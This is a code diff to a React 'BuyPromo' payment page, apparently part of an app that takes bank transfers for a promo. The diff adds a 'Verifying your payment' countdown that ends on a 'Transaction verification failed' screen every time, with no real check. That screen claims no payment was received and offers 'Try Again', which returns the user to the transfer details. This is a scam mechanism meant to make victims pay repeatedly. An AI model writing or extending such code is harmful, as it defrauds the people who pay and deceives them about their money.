@@ -1,10 +1,10 @@
 import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { ArrowLeft, Copy, Check } from "lucide-react";
+import { ArrowLeft, Copy, Check, X } from "lucide-react";
 import { Dialog, DialogContent } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
 
-type PageState = "form" | "loading" | "notice" | "account";
+type PageState = "form" | "loading" | "notice" | "account" | "verifying" | "failed";
 
 const BuyPromo = () => {
   const navigate = useNavigate();
@@ -12,11 +12,26 @@ const BuyPromo = () => {
   const [email, setEmail] = useState("");
   const [pageState, setPageState] = useState<PageState>("form");
   const [copiedField, setCopiedField] = useState<string | null>(null);
+  const [countdown, setCountdown] = useState(3);
 
   useEffect(() => {
     if (pageState === "loading") {
       const timer = setTimeout(() => setPageState("notice"), 3000);
       return () => clearTimeout(timer);
+    }
+    if (pageState === "verifying") {
+      setCountdown(3);
+      const interval = setInterval(() => {
+        setCountdown((prev) => {
+          if (prev <= 1) {
+            clearInterval(interval);
+            setPageState("failed");
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+      return () => clearInterval(interval);
     }
   }, [pageState]);
 
@@ -47,6 +62,67 @@ const BuyPromo = () => {
     );
   }
 
+  // Verifying payment screen
+  if (pageState === "verifying") {
+    const progress = ((3 - countdown) / 3) * 100;
+    return (
+      <div className="min-h-screen bg-background flex flex-col items-center justify-center">
+        <div className="relative w-32 h-32 mb-8">
+          <svg className="w-full h-full transform -rotate-90" viewBox="0 0 120 120">
+            <circle cx="60" cy="60" r="52" stroke="hsl(var(--muted))" strokeWidth="8" fill="none" />
+            <circle cx="60" cy="60" r="52" stroke="hsl(var(--primary))" strokeWidth="8" fill="none"
+              strokeLinecap="round" strokeDasharray={`${2 * Math.PI * 52}`}
+              strokeDashoffset={`${2 * Math.PI * 52 * (1 - progress / 100)}`}
+              className="transition-all duration-1000" />
+          </svg>
+          <div className="absolute inset-0 flex items-center justify-center">
+            <span className="text-4xl font-bold text-foreground">{countdown}</span>
+          </div>
+        </div>
+        <h2 className="text-xl font-bold text-foreground">Verifying your payment</h2>
+        <p className="text-primary mt-2 text-center px-8">
+          Please wait while we confirm your bank transfer...
+        </p>
+      </div>
+    );
+  }
+
+  // Transaction verification failed screen
+  if (pageState === "failed") {
+    return (
+      <div className="min-h-screen bg-background flex flex-col items-center justify-center px-6">
+        <div className="w-24 h-24 rounded-full bg-red-500 flex items-center justify-center mb-6">
+          <X className="w-12 h-12 text-white" />
+        </div>
+        <h2 className="text-2xl font-bold text-yellow-500 mb-4">Transaction verification failed!</h2>
+        <p className="text-foreground text-center mb-1">Your payment could not be completed.</p>
+        <p className="text-foreground text-center mb-6">
+          Reason: No Payment received from you<br />or Invalid payment method.
+        </p>
+        <p className="text-muted-foreground text-center mb-1">If you need help contact us</p>
+        <div className="flex items-center gap-2 mb-8">
+          <span className="font-bold text-foreground">dailypay619@gmail.com</span>
+          <button onClick={() => handleCopy("dailypay619@gmail.com", "email")}>
+            {copiedField === "email" ? <Check className="w-5 h-5 text-primary" /> : <Copy className="w-5 h-5 text-muted-foreground" />}
+          </button>
+        </div>
+        <Button
+          onClick={() => setPageState("account")}
+          className="w-full py-6 bg-green-primary hover:bg-green-primary/90 text-primary-foreground font-bold text-base rounded-xl mb-3"
+        >
+          Try Again
+        </Button>
+        <Button
+          onClick={() => navigate("/dashboard")}
+          variant="outline"
+          className="w-full py-6 font-bold text-base rounded-xl"
+        >
+          Go to Dashboard
+        </Button>
+      </div>
+    );
+  }
+
   // Account details screen
   if (pageState === "account") {
     return (
@@ -55,7 +131,6 @@ const BuyPromo = () => {
           <h1 className="text-xl font-bold text-foreground">Bank Transfer</h1>
           <button onClick={() => navigate(-1)} className="text-red-500 font-semibold">Cancel</button>
         </div>
-
         <div className="p-4">
           <div className="flex items-center justify-between mb-1">
             <div className="w-14 h-14 rounded-full bg-green-primary flex items-center justify-center">
@@ -120,7 +195,7 @@ const BuyPromo = () => {
             </p>
 
             <Button
-              onClick={() => navigate("/dashboard")}
+              onClick={() => setPageState("verifying")}
               className="w-full py-6 bg-yellow-500 hover:bg-yellow-500/90 text-foreground font-bold text-base rounded-xl"
             >
               I have made this bank Transfer
